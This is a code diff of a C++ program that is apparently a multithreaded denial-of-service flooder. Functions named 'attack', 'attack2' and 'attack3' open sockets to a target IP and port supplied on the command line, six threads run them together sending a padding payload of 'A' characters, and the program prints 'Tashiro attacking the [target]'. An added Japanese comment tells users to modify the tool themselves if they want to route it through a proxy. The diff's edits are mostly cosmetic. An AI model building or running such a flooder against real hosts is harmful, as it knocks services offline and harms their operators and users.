@@ -1,3 +1,8 @@
+/*
+*  プロキシに通しての実行は出来ないのでご了承ください。
+*  もし、プロキシを通したい人がいるならばご自分で改造してください。
+*/
+
 #include<cstdio>
 #include<cstdlib>
 #include<cstring>
@@ -10,17 +15,19 @@
 #include <unistd.h>
 
 #include <thread>
+using std::thread;
 
+int port{};
 const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                     "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";
-int port;
+                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+                    "AAAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";
 
 void attack(char* str)
 {
-    int soc;
+    int soc{};
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -50,7 +57,7 @@ void attack(char* str)
 
 void attack2(char* str)
 {
-    int sock;
+    int sock{};
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -80,7 +87,7 @@ void attack2(char* str)
 
 void attack3(char* str)
 {
-    int socks;
+    int socks{};
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -115,7 +122,7 @@ int main(int argc, char* argv[])
         return -1;
     }
     struct hostent* he;
-    char* str = nullptr;
+    char* str = NULL;
 
     if (argc < 3) {
         printf("\nHow to use: %s <IP_address> <Port_number>\n\n", argv[0]);
@@ -133,12 +140,12 @@ int main(int argc, char* argv[])
 
     printf("\n神降臨\n\nTashiro attacking the %s.(To stop, press C + Ctrl)\n\n", str);
 
-    std::thread t1(attack, str);
-    std::thread t2(attack, str);
-    std::thread t3(attack2, str);
-    std::thread t4(attack2, str);
-    std::thread t5(attack3, str);
-    std::thread t6(attack3, str);
+    thread t1(attack, str);
+    thread t2(attack, str);
+    thread t3(attack2, str);
+    thread t4(attack2, str);
+    thread t5(attack3, str);
+    thread t6(attack3, str);
 
     t1.join();
     t2.join();
